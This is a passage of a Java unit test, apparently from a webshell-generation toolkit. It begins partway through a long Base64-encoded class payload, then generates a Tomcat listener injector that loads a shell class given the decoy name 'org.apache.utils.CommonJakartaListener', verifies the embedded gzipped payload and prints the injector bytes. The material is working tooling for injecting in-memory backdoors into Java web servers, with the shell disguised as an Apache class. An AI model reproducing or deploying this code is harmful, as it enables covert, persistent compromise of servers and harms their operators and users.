AewB8AAEAVgAAAWsABgAFAAAAfgFMEgu4AAxNLBIaAcAADrYADywBwAAQtgARTi22AAMSGwS9AG1ZAxJ5U7YADy0EvQAEWQMqU7YAEcAAFMAAFEynADxOEhy4AAxNLLYAGDoEGQS2AAMSHQS9AG1ZAxJ5U7YADxkEBL0ABFkDKlO2ABHAABTAABRMpwAFOgQrsAACAAIAQABDAHoARAB3AHoAegAEAGsAAAApAAP/AEMAAgcAeQcAFAABBwB6/wA2AAQHAHkHABQABwB6AAEHAHr5AAEAVwAAADIADAAAAEcAAgBKAAgASwAbAEwAQABUAEMATQBEAE8ASgBQAFAAUQB3AFMAegBSAHwAVQBYAAAASAAHABsAJQB9AGMAAwAIADsAcwBoAAIAUAAnAH0AYwAEAEoAMABzAGgAAgBEADgAdAB1AAMAAAB+AHYATwAAAAIAfAB4AHcAAQBpAAAAFgACAAgAOwBzAGoAAgBKADAAcwBqAAIAAQB+AH8AAgBWAAAAPQAEAAIAAAAJKisDK763AB6wAAAAAgBXAAAABgABAAAAWgBYAAAAFgACAAAACQBZAT8AAAAAAAkAgAB3AAEAgQAAAAIAggABAIMAhAABAFYAAADYAAYABAAAACwSH7gAIE4tHJkABwSnAAQFuwAhWSq0ATW2ACMSH7cAJLYAJS0rtgAmsE4BsAABAAAAKAApAHoAAwBrAAAAPAAD/wAPAAQHATAHABQBBwDEAAEHAMT/AAAABAcBMAcAFAEHAMQAAgcAxAH/ABgAAwcBMAcAFAEAAQcAegBXAAAAFgAFAAAAXwAGAGAAIwBhACkAYgAqAGMAWAAAADQABQAGACMAhQCGAAMAKgACAIcAdQADAAAALABZAT8AAAAAACwAiAB3AAEAAAAsAIkAigACAAEAjQCOAAEAVgAAAfYABQAIAAAA+Su2ACfAAJxNLCq0ATu5ACoCAMYA4iwqtAE7uQAqAgAqtAE+tgAsmQDOKiy3AUBOLLkALgEAOgQsKrQBMrkAMAIAuAFBOgUqGQUDtgFCOgUZBBIzuQA0AgDHACIZBBIzuwEwWSq2AAO2ADa3AUMZBbYBRLkAOQMApwB9LBI6GQW5ADsDALsAPFm3AD06BhkEEjO5ADQCAMAAbbYAGDoHGQcZBrYAPlcZByy2AD5XLbkAPwEAKrQBOAMQELYAQbYAQhkHtgBDVy25AD8BACoZBrYARAS2AUK4AUW2AEItuQA/AQAqtAE4EBC2AEa2AEItuQBHAQCnAAROsQABAAgA9AD3AHoAAwBrAAAAIwAE/wB6AAYHATAHAMwHAJwHAJ0HANoHABQAAPgAeUIHAHoAAFcAAABiABgAAABqAAgAbAAaAG0AKQBuAC8AbwA3AHAARgBxAE8AcgBbAHMAZAB1AHIAcwB6AHcAhAB4AI0AeQCeAHoApgB7AK0AfADAAH0AxgB+ANwAfwDuAIAA9ACEAPcAgwD4AIUAWAAAAFIACACNAGcAjwCQAAYAngBWAJEAYwAHAC8AxQCSAJMAAwA3AL0AlACVAAQARgCuAJYAdwAFAAAA+QBZAT8AAAAAAPkAlwCYAAEACADxAJkAmgACAAIAnwCgAAIAVgAAAKEAAgAEAAAAIQFNKxJIuAFGEkq4AUbAAJ1NpwAOTisSSrgBRsAAnU0ssAABAAIAEQAUAHoAAwBrAAAAFgAC/wAUAAMHATAHAJwHAJ0AAQcAegoAVwAAABoABgAAAIgAAgCKABEAjQAUAIsAFQCMAB8AjgBYAAAAKgAEABUACgChAHUAAwAAACEAWQE/AAAAAAAhAJkAmgABAAIAHwCSAJMAAgBvAAAABAABAHoAAQCiAAAAAgCj");
        String shellClassName = "org.apache.utils.CommonJakartaListener";
        String injectClassName = this.getClass().getName() + "2";
        byte[] bytes = InjectorGenerator.generate(TomcatListenerInjector.class, injectClassName, shellClassName, shellBytes, null);
        Object obj = ClassUtils.newInstance(bytes);
        assertEquals(injectClassName, obj.getClass().getName());
        assertEquals(shellClassName, ClassUtils.invokeMethod(obj, "getClassName", null, null).toString());
        assertEquals(Base64.encodeBase64String(CommonUtil.gzipCompress(shellBytes)).replace(System.lineSeparator(), ""),
                ClassUtils.invokeMethod(obj, "getBase64String", null, null).toString());
        System.out.println(Base64.encodeBase64String(bytes));
    }
}